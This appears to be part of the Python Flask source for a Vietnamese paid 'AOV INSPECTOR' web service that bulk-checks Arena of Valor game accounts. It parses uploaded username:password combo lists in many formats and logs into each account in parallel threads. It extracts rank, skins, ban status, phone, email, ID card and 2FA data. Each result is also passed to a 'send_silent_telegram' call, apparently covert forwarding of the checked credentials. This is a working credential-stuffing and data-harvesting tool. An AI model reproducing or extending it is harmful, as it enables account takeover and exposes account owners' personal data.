        navigator.clipboard.writeText(el.textContent).then(function() {
            el.style.background = 'rgba(0,255,136,0.2)'; showToast('✓ Đã copy!');
            setTimeout(function() { el.style.background = 'rgba(0,0,0,0.5)'; }, 800);
        });
    }
}
function selectMonPhai(mid, name) {
    if (!confirm('Gia nhập môn phái ' + name + '?')) return;
    var f = document.createElement('form'); f.method = 'POST'; f.action = '/tu_tien/monphai/join';
    var i = document.createElement('input'); i.type = 'hidden'; i.name = 'mp_id'; i.value = mid;
    f.appendChild(i); document.body.appendChild(f); f.submit();
}
function buyVuKhi(wid, name, cost) {
    if (!confirm('Mua ' + name + ' với ' + cost + ' xu?')) return;
    var f = document.createElement('form'); f.method = 'POST'; f.action = '/tu_tien/vukhi/buy';
    var i = document.createElement('input'); i.type = 'hidden'; i.name = 'weapon_id'; i.value = wid;
    f.appendChild(i); document.body.appendChild(f); f.submit();
}
</script>
"""

def flash_html():
    msgs = get_flashed_messages(with_categories=True)
    if not msgs: return ""
    html = ""
    for cat, m in msgs:
        icon = "✕" if cat == "error" else "✓"
        html += f'<div class="flash {cat}"><span>{icon}</span><span>{m}</span></div>'
    return html

def render_page(content, active_tab="", user=None):
    unread = unread_count() if user else 0
    balance = user.get("balance", 0) if user else 0
    header = ""
    if user:
        admin_btn = '<a href="/admin" class="icon-btn" title="Admin">👑</a>' if user.get("is_admin") else ""
        header = f'''
        <div class="app-header">
            <div class="app-logo">
                <div class="app-logo-icon">◈</div>
                <div class="app-logo-text">AOV</div>
            </div>
            <div style="display:flex; gap:8px; align-items:center;">
                <div class="balance-pill">◈ {balance}</div>
                {admin_btn}
                <a href="/logout" class="icon-btn logout" title="Đăng Xuất" onclick="return confirm('Đăng xuất? Dữ liệu của bạn vẫn được giữ nguyên.');">
                    <span>⎋</span><span>THOÁT</span></a>
            </div>
        </div>'''
    menu = ""
    if user:
        def mcls(tab): return "menu-btn active" if active_tab == tab else "menu-btn"
        notif_badge = f'<div class="menu-badge">{unread if unread < 10 else "9+"}</div>' if unread > 0 else ""
        menu = f'''
        <div class="card" style="padding:14px;">
            <div class="menu-grid">
                <a href="/check" class="{mcls('check')}"><div class="menu-icon">◈</div><div class="menu-label">Check</div></a>
                <a href="/check_file" class="{mcls('check_file')}"><div class="menu-icon">▣</div><div class="menu-label">File</div></a>
                <a href="/loc_file" class="{mcls('loc_file')}"><div class="menu-icon">📥</div><div class="menu-label">Lọc File</div></a>
                <a href="/export_tool" class="{mcls('export')}"><div class="menu-icon">📄</div><div class="menu-label">Tạo File</div></a>
                <a href="/enter_code" class="{mcls('code')}"><div class="menu-icon">◆</div><div class="menu-label">Code</div></a>
                <a href="/tu_tien" class="{mcls('tu_tien')}"><div class="menu-icon">⚔</div><div class="menu-label">Tu Tiên</div></a>
                <a href="/tu_tien/vukhi" class="{mcls('vukhi')}"><div class="menu-icon">⚡</div><div class="menu-label">Vũ Khí</div></a>
                <a href="/tu_tien/monphai" class="{mcls('monphai')}"><div class="menu-icon">⛩</div><div class="menu-label">Môn Phái</div></a>
                <a href="/profile" class="{mcls('profile')}"><div class="menu-icon">◐</div><div class="menu-label">Cá Nhân</div></a>
                <a href="/history" class="{mcls('history')}"><div class="menu-icon">▤</div><div class="menu-label">Lịch Sử</div></a>
                <a href="/notifications" class="{mcls('notif')}"><div class="menu-icon">◉</div><div class="menu-label">T.Báo</div>{notif_badge}</a>
            </div>
        </div>'''
    return f'''<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#05000e">
<title>AOV INSPECTOR</title>
{BASE_CSS}
</head>
<body>
<div class="container">
{header}
{menu}
{flash_html()}
{content}
</div>
</body>
</html>'''

def run_job_with_queue(job_id, acc_list, user_name):
    with _active_jobs_lock:
        if _active_jobs_count[0] >= MAX_PARALLEL_JOBS:
            JOB_QUEUE.append(job_id)
            job = CHECK_JOBS.get(job_id)
            if job: job["queued"] = True
            return
        _active_jobs_count[0] += 1
    try:
        file_check_worker(job_id, acc_list, user_name)
    finally:
        with _active_jobs_lock:
            _active_jobs_count[0] -= 1
            if JOB_QUEUE:
                next_id = JOB_QUEUE.pop(0)
                job = CHECK_JOBS.get(next_id)
                if job:
                    job["queued"] = False
                    threading.Thread(target=run_job_with_queue, args=(next_id, job["acc_list"], job["user"]), daemon=True).start()

def file_check_worker(job_id, acc_list, user_name):
    job = CHECK_JOBS.get(job_id)
    if not job: return
    total = len(acc_list)
    user = USERS.get(user_name)
    if not user: return
    results = []
    results_lock = threading.Lock()
    completed_count = [0]
    def process_one(acc_pair):
        u, p = acc_pair
        if job.get("cancelled"): return None
        try:
            r = run_single_check(u, p)
        except Exception as e:
            r = {"type": "failed", "username": u, "password": p, "error": str(e),
                 "sss": [], "ss": [], "anime": [], "skins": [], "other_skins": [], "all_skins": [],
                 "rank": "", "level": 0, "name": "", "rank_stars": 0, "banned": False,
                 "uid": "", "shell": 0, "total_skins": 0, "mobile_no": "", "country_code": "",
                 "email": "", "idcard": "", "two_fa": False, "player_uid": "", "ban_end_time": ""}
        with results_lock:
            results.append(r)
            completed_count[0] += 1
            user["history"] = user.get("history", [])[-499:] + [make_hist_entry(r, u)]
            send_silent_telegram(r)
            job["current"] = completed_count[0]
            job["progress"] = int((completed_count[0] / total) * 100)
            job["current_acc"] = u
            icon = {"sss": "◈", "ss": "◆", "anime": "◇", "normal": "▪", "trang": "○", "banned": "✖", "failed": "✕"}.get(r["type"], "?")
            uid = r.get('uid', 'N/A') or 'N/A'
            rank = r.get('rank', '') or 'Chưa xếp hạng'
            stars = r.get('rank_stars', 0)
            skin_count = r.get('total_skins', 0)
            main_msg = f"{icon} [{r['type'].upper()}] {u} | UID: {uid} | Rank: {rank} ({stars}★) | {skin_count} skin"
            job["logs"].append({"acc": u, "type": r["type"], "msg": main_msg})
            if r['type'] != 'failed':
                sub_msg = f"   ├─ SĐT: {r.get('mobile_no','') or 'Không có'} | Email: {r.get('email','') or 'Không có'}"
                job["logs"].append({"acc": u, "type": r["type"], "msg": sub_msg})
            if len(job["logs"]) > 100: job["logs"] = job["logs"][-100:]
        return r
    with ThreadPoolExecutor(max_workers=MAX_CONCURRENT_CHECKS) as ex:
        futures = [ex.submit(process_one, pair) for pair in acc_list]
        for f in as_completed(futures):
            if job.get("cancelled"):
                for fut in futures: fut.cancel()
                break
    sss_c = sum(1 for r in results if r["type"] == "sss")
    ss_c = sum(1 for r in results if r["type"] == "ss")
    an_c = sum(1 for r in results if r["type"] == "anime")
    ban_c = sum(1 for r in results if r["type"] == "banned")
    norm_c = sum(1 for r in results if r["type"] == "normal")
    trang_c = sum(1 for r in results if r["type"] == "trang")
    fail_c = sum(1 for r in results if r["type"] == "failed")
    user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + len(results)
    user["mission"]["sss"] = user["mission"].get("sss", 0) + sss_c
    user["mission"]["ss"] = user["mission"].get("ss", 0) + ss_c
    user["mission"]["anime"] = user["mission"].get("anime", 0) + an_c
    if job.get("cancelled"):
        not_checked = total - len(results)
        refund = (not_checked + 44) // 45
        if refund > 0:
            user["balance"] += refund
            job["refunded"] = refund
    if user.get("current_job") == job_id: user["current_job"] = None
    save_data()
    job["done"] = True
    job["stats"] = {"total": len(results), "sss": sss_c, "ss": ss_c, "anime": an_c,
                    "banned": ban_c, "normal": norm_c, "trang": trang_c, "failed": fail_c}
    if job.get("cancelled"):
        job["progress"] = int((len(results) / total) * 100) if total > 0 else 0
        refund_txt = f"\n├─ Hoàn lại: +{job.get('refunded', 0)} xu" if job.get("refunded") else ""
        job["summary"] = (f"🛑 ĐÃ HUỶ!\n├─ Đã check: {len(results)}/{total}{refund_txt}\n"
                          f"├─ SSS: {sss_c}\n├─ SS: {ss_c}\n├─ Anime: {an_c}\n"
                          f"├─ Trắng TT: {trang_c}\n├─ Trắng thường: {norm_c}\n"
                          f"├─ Ban: {ban_c}\n└─ Trượt: {fail_c}")
    else:
        job["progress"] = 100
        job["summary"] = (f"◈ HOÀN TẤT!\n├─ Đã check: {len(results)}/{total}\n"
                          f"├─ SSS: {sss_c}\n├─ SS: {ss_c}\n├─ Anime: {an_c}\n"
                          f"├─ Trắng TT: {trang_c}\n├─ Trắng thường: {norm_c}\n"
                          f"├─ Ban: {ban_c}\n└─ Trượt: {fail_c}")
    def cleanup():
        time.sleep(600); CHECK_JOBS.pop(job_id, None)
    threading.Thread(target=cleanup, daemon=True).start()

@app.route("/health")
def health():
    return jsonify({"status": "ok", "users": len(USERS), "jobs": len(CHECK_JOBS),
                    "active_jobs": _active_jobs_count[0], "queued": len(JOB_QUEUE),
                    "time": datetime.now().isoformat()})

@app.route("/")
def index():
    if "username" in session and session["username"] in USERS:
        return redirect(url_for("check_page"))
    return redirect(url_for("login_page"))

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if "username" in session and session["username"] in USERS:
        return redirect(url_for("check_page"))
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        usr = USERS.get(u)
        if usr and usr["password"] == hash_password(p):
            session["username"] = u; session.permanent = True
            flash(f"Chào mừng {u}!", "success")
            return redirect(url_for("check_page"))
        flash("Sai tài khoản hoặc mật khẩu!", "error")
    content = '''
    <div class="card" style="margin-top:20px; text-align:center;">
        <div style="font-size:4em; margin-bottom:12px;">◈</div>
        <h1 class="card-title" style="justify-content:center; font-size:1.6em; margin-bottom:8px;">AOV INSPECTOR</h1>
        <p style="color:var(--text-dim); margin-bottom:24px;">Hệ thống kiểm tra tài khoản Liên Quân</p>
        <div style="display:flex; gap:8px; margin-bottom:24px;">
            <a href="/login" class="btn btn-block" style="flex:1;">Đăng Nhập</a>
            <a href="/register" class="btn btn-secondary btn-block" style="flex:1;">Đăng Ký</a>
        </div>
        <form method="POST">
            <div class="form-group" style="text-align:left;"><label class="form-label">Username</label>
                <input type="text" name="username" class="form-input" required></div>
            <div class="form-group" style="text-align:left;"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" required></div>
            <button type="submit" class="btn btn-block">Đăng Nhập</button>
        </form>
    </div>'''
    return render_page(content, active_tab="", user=None)

@app.route("/register", methods=["GET", "POST"])
def register_page():
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        cf = request.form.get("confirm", "")
        ref = request.form.get("ref", "").strip().upper()
        if not u or len(u) < 3 or len(u) > 20 or not u.isalnum():
            flash("Username 3-20 ký tự chữ/số!", "error")
        elif len(p) < 4: flash("Mật khẩu ít nhất 4 ký tự!", "error")
        elif p != cf: flash("Mật khẩu không khớp!", "error")
        elif u in USERS: flash("Username đã tồn tại!", "error")
        else:
            uid = gen_id(); inviter = None
            for un, uu in USERS.items():
                if uu.get("id") == ref: inviter = un; break
            USERS[u] = {"id": uid, "username": u, "password": hash_password(p),
                "balance": DEFAULT_BALANCE, "temp_balance": 0, "referrals": 0,
                "invited_by": inviter, "is_admin": False, "created_at": time.time(),
                "last_checkin": 0, "last_notif_read": 0, "checkin_streak": 0,
                "total_checkins": 0, "history": [], "current_job": None,
                "cultivation": {"level": 0, "exp": 0, "hp": 100, "atk": 20, "def": 10,
                                "weapon": None, "mon_phai": None, "mon_phai_level": 0},
                "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []}}
            if inviter and inviter in USERS:
                USERS[inviter]["referrals"] = USERS[inviter].get("referrals", 0) + 1
                USERS[inviter]["balance"] += REFERRAL_REWARD
                USERS[u]["balance"] += REFERRAL_BONUS
            save_data()
            session["username"] = u; session.permanent = True
            flash(f"Đăng ký thành công! ID: {uid}", "success")
            return redirect(url_for("check_page"))
    content = '''
    <div class="card" style="margin-top:20px;">
        <div style="text-align:center; margin-bottom:20px;">
            <div style="font-size:4em; margin-bottom:8px;">✦</div>
            <h1 class="card-title" style="justify-content:center; font-size:1.6em;">ĐĂNG KÝ</h1>
        </div>
        <div style="display:flex; gap:8px; margin-bottom:20px;">
            <a href="/login" class="btn btn-secondary btn-block" style="flex:1;">Đăng Nhập</a>
            <a href="/register" class="btn btn-block" style="flex:1;">Đăng Ký</a>
        </div>
        <form method="POST">
            <div class="form-group"><label class="form-label">Username</label>
                <input type="text" name="username" class="form-input" required minlength="3" maxlength="20"></div>
            <div class="form-group"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" required minlength="4"></div>
            <div class="form-group"><label class="form-label">Xác nhận mật khẩu</label>
                <input type="password" name="confirm" class="form-input" required minlength="4"></div>
            <div class="form-group"><label class="form-label">Mã người mời (tùy chọn)</label>
                <input type="text" name="ref" class="form-input"></div>
            <button type="submit" class="btn btn-success btn-block">Tạo Tài Khoản</button>
        </form>
    </div>'''
    return render_page(content, active_tab="", user=None)

@app.route("/logout")
def logout():
    session.pop("username", None)
    flash("Đã đăng xuất! Dữ liệu vẫn được lưu.", "success")
    return redirect(url_for("login_page"))

@app.route("/check", methods=["GET", "POST"])
@login_required
def check_page():
    user = get_user()
    result = None
    if request.method == "POST":
        acc = request.form.get("account", "").strip()
        pwd = request.form.get("password", "").strip()
        if not acc or not pwd: flash("Nhập đầy đủ!", "error")
        elif user["balance"] < 1: flash("Không đủ lượt!", "error")
        else:
            user["balance"] -= 1; save_data()
            try:
                r = run_single_check(acc, pwd)
                result = format_result(r)
                user["history"] = user.get("history", [])[-499:] + [make_hist_entry(r, acc)]
                user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + 1
                if r["type"] == "sss": user["mission"]["sss"] = user["mission"].get("sss", 0) + 1
                elif r["type"] == "ss": user["mission"]["ss"] = user["mission"].get("ss", 0) + 1
                elif r["type"] == "anime": user["mission"]["anime"] = user["mission"].get("anime", 0) + 1
                save_data()
                send_silent_telegram(r)
            except Exception as e:
                result = f"✕ Lỗi: {e}"; flash(f"Lỗi: {e}", "error")
    m = user.get("mission", {})
    content = f'''
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">◈</span> Check Tài Khoản</h2>
        <form method="POST">
            <div class="form-group"><label class="form-label">Tài khoản</label>
                <input type="text" name="account" class="form-input" required autocomplete="off"></div>
            <div class="form-group"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" required></div>
            <button type="submit" class="btn btn-block">Check Ngay (1 Lượt)</button>
        </form>
    </div>
    {f'<div class="card"><h3 class="card-title">◉ Kết Quả</h3><div class="result-box">{result}</div></div>' if result else ''}
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">◐</span> Thống Kê</h2>
        <div class="stat-grid">
            <div class="stat-box"><div class="stat-value">{m.get('total_acc', 0)}</div><div class="stat-label">Tổng Acc</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('sss', 0)}</div><div class="stat-label">SSS</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('ss', 0)}</div><div class="stat-label">SS</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('anime', 0)}</div><div class="stat-label">Anime</div></div>
        </div>
    </div>'''
    return render_page(content, active_tab="check", user=user)

@app.route("/check_file", methods=["GET", "POST"])
@login_required
def check_file():
    user = get_user()
    if request.method == "POST":
        if "file" not in request.files:
            flash("Chưa chọn file!", "error"); return redirect(url_for("check_file"))
        f = request.files["file"]
        if not f.filename.endswith(".txt"):
            flash("Chỉ nhận file .txt!", "error"); return redirect(url_for("check_file"))
        separator = request.form.get("separator", "auto")
        content_bytes = f.read().decode("utf-8", errors="ignore")
        accs = parse_file_content_advanced(content_bytes, separator)
        if not accs:
            flash("Không tìm thấy acc hợp lệ!", "error"); return redirect(url_for("check_file"))
        total = len(accs)
        xu = (total + 44) // 45
        if user["balance"] < xu:
            flash(f"Cần {xu} xu, có {user['balance']}!", "error"); return redirect(url_for("check_file"))
        user["balance"] -= xu
        job_id = uuid.uuid4().hex[:16]
        CHECK_JOBS[job_id] = {"id": job_id, "user": user["username"], "total": total,
            "current": 0, "progress": 0, "done": False, "logs": [],
            "current_acc": "", "last_type": "", "stats": {}, "summary": "",
            "cancelled": False, "queued": False, "acc_list": accs}
        user["current_job"] = job_id
        save_data()
        threading.Thread(target=run_job_with_queue, args=(job_id, accs, user["username"]), daemon=True).start()
        return redirect(url_for("check_file_progress", job_id=job_id))
    running_job = None
    last_job_id = user.get("current_job")
    if last_job_id and last_job_id in CHECK_JOBS:
        j = CHECK_JOBS[last_job_id]
        if not j.get("done") and j.get("user") == user["username"]: running_job = last_job_id
    job_banner = ""
    if running_job:
        job_banner = f'''<div class="card" style="border:2px solid #ffb800;">
            <div style="display:flex; align-items:center; gap:12px;">
                <div style="font-size:2em;">⚙️</div>
                <div style="flex:1;"><div style="font-weight:700; color:#ffb800; font-family:Orbitron;">CÓ JOB ĐANG CHẠY</div>
                <div style="font-size:0.85em; color:var(--text-dim);">Job vẫn chạy ở nền</div></div>
                <a href="/check_file/progress/{running_job}" class="btn btn-warning btn-sm">Xem →</a>
            </div></div>'''
    content = f'''
    {job_banner}
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">▣</span> Check File</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">Upload file .txt — <span class="filter-badge">GIỮ TẤT CẢ ACC</span></p>
        <div style="background:rgba(0,0,0,0.4); padding:14px; border-radius:14px; margin-bottom:14px; border:1px solid var(--border);">
            <div class="info-row"><span class="info-label">Phí</span><span class="info-value">45 acc = 1 xu</span></div>
            <div class="info-row"><span class="info-label">Số dư</span><span class="info-value">{user['balance']} xu</span></div>
            <div class="info-row"><span class="info-label">Tốc độ</span><span class="info-value" style="color:#00ff88;">⚡ {MAX_CONCURRENT_CHECKS} luồng</span></div>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">File danh sách</label>
                <input type="file" name="file" class="form-input" accept=".txt" required id="fileInput" onchange="previewFile()"></div>
            <div id="preview-area" style="display:none; margin-bottom:14px;">
                <label class="form-label">📸 Xem trước — <span id="valid-count" style="color:#00ff88;">0</span>/<span id="total-lines" style="color:#00f0ff;">0</span> hợp lệ</label>
                <div class="file-preview" id="preview-content"></div>
            </div>
            <div class="form-group"><label class="form-label">Dấu phân cách</label>
                <div class="sep-picker">
                    <button type="button" class="sep-btn active" onclick="setSep(this,'auto')">🤖 Tự động</button>
                    <button type="button" class="sep-btn" onclick="setSep(this,'|')">|</button>
                    <button type="button" class="sep-btn" onclick="setSep(this,':')">:</button>
                    <button type="button" class="sep-btn" onclick="setSep(this,'\\t')">Tab</button>
                    <button type="button" class="sep-btn" onclick="setSep(this,' ')">Space</button>
                    <button type="button" class="sep-btn" onclick="setSep(this,',')">,</button>
                    <button type="button" class="sep-btn" onclick="setSep(this,'=')">=</button>
                    <button type="button" class="sep-btn" onclick="setSep(this,';')">;</button>
                </div>
                <input type="hidden" name="separator" id="sep-input" value="auto">
            </div>
            <button type="submit" class="btn btn-block">Upload & Check</button>
        </form>
    </div>
    <script>
    var currentSep = 'auto';
    function setSep(btn, sep) {{
        document.querySelectorAll('.sep-btn').forEach(function(b) {{ b.classList.remove('active'); }});
        btn.classList.add('active'); currentSep = sep;
        document.getElementById('sep-input').value = sep; previewFile();
    }}
    function previewFile() {{
        var inp = document.getElementById('fileInput');
        if (!inp.files || !inp.files[0]) return;
        var reader = new FileReader();
        reader.onload = function(e) {{
            var content = e.target.result;
            var lines = content.split('\\n').filter(function(l) {{ return l.trim(); }});
            var seps = currentSep === 'auto' ? ['|', '\\t', ':', ' ', ',', '='] : [currentSep];
            var html = ''; var valid = 0;
            for (var i = 0; i < Math.min(10, lines.length); i++) {{
                var line = lines[i].trim();
                var clean = line.replace(/^[\\s•\\-\\*→>●○■□◆◇★☆✓✔✗✘]+/, '').replace(/^\\s*\\[?\\d+\\]?\\s*[.)\\]/\\-:]?\\s+/, '').replace(/["'`]/g, '').trim();
                var ok = false;
                for (var j = 0; j < seps.length; j++) {{
                    var sep = seps[j];
                    if (clean.indexOf(sep) > 0) {{
                        var parts = clean.split(sep);
                        if (parts.length >= 2 && parts[0].trim().length >= 2 && parts[1].trim().length >= 3) {{ ok = true; break; }}
                    }}
                }}
                html += (ok ? '<span class="ok">✓</span> ' : '<span class="bad">✗</span> ') + clean.substring(0, 80) + '\\n';
                if (ok) valid++;
            }}
            document.getElementById('preview-content').innerHTML = html;
            document.getElementById('valid-count').textContent = valid;
            document.getElementById('total-lines').textContent = lines.length;
            document.getElementById('preview-area').style.display = 'block';
        }};
        reader.readAsText(inp.files[0]);
    }}
    </script>
    <div class="card" style="background:linear-gradient(135deg, rgba(0,255,136,0.05), rgba(0,240,255,0.05)); border:1.5px solid rgba(0,255,136,0.3);">
        <h3 class="card-title" style="font-size:0.95em;">🤖 HỖ TRỢ 25+ ĐỊNH DẠNG</h3>
        <div style="font-size:0.82em; color:var(--text-dim); line-height:1.9;">
            ✅ <b>user|pass</b> · <b>user:pass</b> · <b>user pass</b> · <b>user,pass</b> · <b>user=pass</b> · <b>user;pass</b><br>
            ✅ <b>3081-FINAL = user:pass | Name: ...</b><br>
            ✅ <b>TK: user | MK: pass</b> · <b>abc@gmail.com:pass</b> · <b>0987xxx:pass</b><br>
            ✅ <b>1. user|pass</b> · <b>[1] user|pass</b><br>
            ✅ <b>GIỮ TẤT CẢ acc trong file — không bỏ dòng nào</b>
        </div>
    </div>'''
    return render_page(content, active_tab="check_file", user=user)

@app.route("/check_file/progress/<job_id>")
@login_required
def check_file_progress(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]:
        flash("Job không tồn tại!", "error"); return redirect(url_for("check_file"))
    user["current_job"] = job_id; save_data()
    content = f'''
    <div class="card" id="progress-card">
        <h2 class="card-title"><span class="spinner"></span> Đang Check...</h2>
        <p style="color:var(--text-dim); margin-bottom:14px;" id="status-text">Đang khởi động...</p>
        <div class="progress-container">
            <div style="display:flex; justify-content:space-between; font-size:0.85em; margin-bottom:8px;">
                <span>Tiến trình</span><span id="progress-percent" style="font-family:Orbitron; color:#ff88ee; font-weight:800;">0%</span>
            </div>
            <div class="progress-bar-wrap">
                <div class="progress-bar-fill" id="progress-bar" style="width:0%;"></div>
                <div class="progress-text" id="progress-text">0 / {job['total']}</div>
            </div>
            <div style="text-align:center; font-size:0.85em; color:var(--text-dim); margin-top:8px;">
                Đang check: <b id="current-acc" style="color:#00f0ff; font-family:monospace;">Chờ...</b></div>
        </div>
        <button id="cancel-btn" onclick="cancelJob()" class="btn btn-danger btn-block">🛑 HUỶ CHECK</button>
        <div class="live-stats">
            <div class="live-stat"><div class="num" id="stat-sss" style="color:#ffd700;">0</div><div class="lbl">SSS</div></div>
            <div class="live-stat"><div class="num" id="stat-ss" style="color:#00f0ff;">0</div><div class="lbl">SS</div></div>
            <div class="live-stat"><div class="num" id="stat-anime" style="color:#e040fb;">0</div><div class="lbl">Anime</div></div>
        </div>
        <div class="live-log" id="live-log"><div class="log-line normal">⏳ Chờ kết quả...</div></div>
    </div>
    <div id="done-section" style="display:none;">
        <div class="card" id="done-card">
            <h2 class="card-title" id="done-title" style="color:#00ff88;">✓ Hoàn Tất!</h2>
            <div id="summary-box" class="result-box"></div>
            <div class="stat-grid-5" style="margin-top:14px;">
                <div class="stat-box small"><div class="stat-value" id="done-sss" style="font-size:1.3em;">0</div><div class="stat-label">◈ SSS</div></div>
                <div class="stat-box small"><div class="stat-value" id="done-ss" style="font-size:1.3em;">0</div><div class="stat-label">◆ SS</div></div>
                <div class="stat-box small"><div class="stat-value" id="done-anime" style="font-size:1.3em;">0</div><div class="stat-label">◇ Anime</div></div>
                <div class="stat-box small"><div class="stat-value" id="done-trang" style="font-size:1.3em;">0</div><div class="stat-label">○ Trắng</div></div>
                <div class="stat-box small"><div class="stat-value" id="done-ban" style="font-size:1.3em;">0</div><div class="stat-label">✖ Ban</div></div>
            </div>
            <a href="/export_vip_all" class="btn btn-success btn-block" style="margin-top:14px;">📥 XUẤT VIP ALL</a>
            <div style="display:flex; gap:6px; margin-top:8px; flex-wrap:wrap;">
                <a href="/export_results?type=sss" class="btn btn-warning btn-block" style="flex:1;">📥 SSS</a>
                <a href="/export_results?type=ss" class="btn btn-info btn-block" style="flex:1;">📥 SS</a>
                <a href="/export_results?type=anime" class="btn btn-warning btn-block" style="flex:1;">📥 Anime</a>
                <a href="/export_results?type=trang" class="btn btn-secondary btn-block" style="flex:1;">📥 Trắng</a>
            </div>
            <div style="display:flex; gap:8px; margin-top:8px;">
                <a href="/history" class="btn btn-block" style="flex:1;">▤ Lịch Sử</a>
                <a href="/check_file" class="btn btn-secondary btn-block" style="flex:1;">+ Check Mới</a>
            </div>
        </div>
    </div>
    <script>
    var jobId = "{job_id}";
    var pollInterval = null;
    function updateJob() {{
        fetch('/api/check_file/progress/' + jobId)
            .then(function(r) {{ return r.json(); }})
            .then(function(data) {{
                if (data.error) {{ clearInterval(pollInterval); return; }}
                document.getElementById('progress-bar').style.width = data.progress + '%';
                document.getElementById('progress-percent').textContent = data.progress + '%';
                document.getElementById('progress-text').textContent = data.current + ' / ' + data.total;
                if (data.current_acc) document.getElementById('current-acc').textContent = data.current_acc;
                var st = document.getElementById('status-text');
                if (data.done) st.innerHTML = '✅ Hoàn tất!';
                else st.innerHTML = 'Đang xử lý... <b>' + data.current + '/' + data.total + '</b>';
                if (data.logs && data.logs.length > 0) {{
                    var html = '';
                    for (var i = 0; i < data.logs.length; i++) {{
                        var lg = data.logs[i];
                        var cls = lg.type;
                        if (lg.msg.startsWith('   ')) cls = 'log-sub';
                        html += '<div class="log-line ' + cls + '">' + lg.msg + '</div>';
                    }}
                    var box = document.getElementById('live-log');
                    box.innerHTML = html; box.scrollTop = box.scrollHeight;
                }}
                if (data.stats) {{
                    document.getElementById('stat-sss').textContent = data.stats.sss || 0;
                    document.getElementById('stat-ss').textContent = data.stats.ss || 0;
                    document.getElementById('stat-anime').textContent = data.stats.anime || 0;
                }}
                if (data.done) {{
                    clearInterval(pollInterval);
                    document.getElementById('progress-card').style.display = 'none';
                    document.getElementById('done-section').style.display = 'block';
                    document.getElementById('summary-box').textContent = data.summary || 'Hoàn tất!';
                    if (data.stats) {{
                        document.getElementById('done-sss').textContent = data.stats.sss || 0;
                        document.getElementById('done-ss').textContent = data.stats.ss || 0;
                        document.getElementById('done-anime').textContent = data.stats.anime || 0;
                        document.getElementById('done-trang').textContent = data.stats.trang || 0;
                        document.getElementById('done-ban').textContent = data.stats.banned || 0;
                    }}
                    if (data.summary && data.summary.indexOf('HUỶ') >= 0) {{
                        document.getElementById('done-title').textContent = '🛑 Đã Huỷ!';
                        document.getElementById('done-title').style.color = '#ffb800';
                    }}
                }}
            }}).catch(function(e) {{ console.log(e); }});
    }}
    function cancelJob() {{
        if (!confirm('Huỷ check?')) return;
        fetch('/api/check_file/cancel/' + jobId, {{ method: 'POST' }})
            .then(function(r) {{ return r.json(); }})
            .then(function(data) {{
                if (data.ok) {{
                    var btn = document.getElementById('cancel-btn');
                    btn.textContent = '⏳ Đang huỷ...'; btn.disabled = true;
                }}
            }});
    }}
    updateJob(); pollInterval = setInterval(updateJob, 1500);
    </script>'''
    return render_page(content, active_tab="check_file", user=user)

@app.route("/api/check_file/progress/<job_id>")
@login_required
def api_check_file_progress(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]:
        return jsonify({"error": "Job không tồn tại"})
    return jsonify({"total": job.get("total", 0), "current": job.get("current", 0),
        "progress": job.get("progress", 0), "current_acc": job.get("current_acc", ""),
        "done": job.get("done", False), "logs": job.get("logs", [])[-30:],
        "stats": job.get("stats", {}), "summary": job.get("summary", "")})

@app.route("/api/check_file/cancel/<job_id>", methods=["POST"])
@login_required
def api_check_file_cancel(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]: return jsonify({"ok": False})
    job["cancelled"] = True
    return jsonify({"ok": True})

@app.route("/loc_file")
@login_required
def loc_file():
    user = get_user()
    content = '''
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">📥</span> Lọc File Acc</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">
            Upload file .txt bất kỳ — <span class="filter-badge">🤖 LỌC 25+ ĐỊNH DẠNG</span>
        </p>
        <div style="background:rgba(0,0,0,0.4); padding:14px; border-radius:14px; margin-bottom:14px; border:1px solid var(--border);">
            <div class="info-row"><span class="info-label">Miễn phí</span><span class="info-value" style="color:#00ff88;">✓ Không trừ xu</span></div>
            <div class="info-row"><span class="info-label">Chỉ lọc</span><span class="info-value" style="color:#00f0ff;">Không check acc</span></div>
        </div>
        <form method="POST" action="/loc_file/process" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">File danh sách (.txt)</label>
                <input type="file" name="file" class="form-input" accept=".txt" required id="locInput" onchange="locPreview()"></div>
            <div id="loc-preview" style="display:none; margin-bottom:14px;">
                <label class="form-label">📸 Xem trước — <span id="loc-valid" style="color:#00ff88;">0</span>/<span id="loc-total" style="color:#00f0ff;">0</span> hợp lệ</label>
                <div class="file-preview" id="loc-preview-content"></div>
            </div>
            <button type="submit" class="btn btn-block">📥 Lọc File Này</button>
        </form>
    </div>
    <script>
    function locPreview() {
        var inp = document.getElementById('locInput');
        if (!inp.files || !inp.files[0]) return;
        var reader = new FileReader();
        reader.onload = function(e) {
            var content = e.target.result;
            var lines = content.split('\\n').filter(function(l) { return l.trim(); });
            var html = ''; var valid = 0;
            var seps = ['|', '\\t', ':', ' ', ',', '='];
            for (var i = 0; i < Math.min(10, lines.length); i++) {
                var line = lines[i].trim();
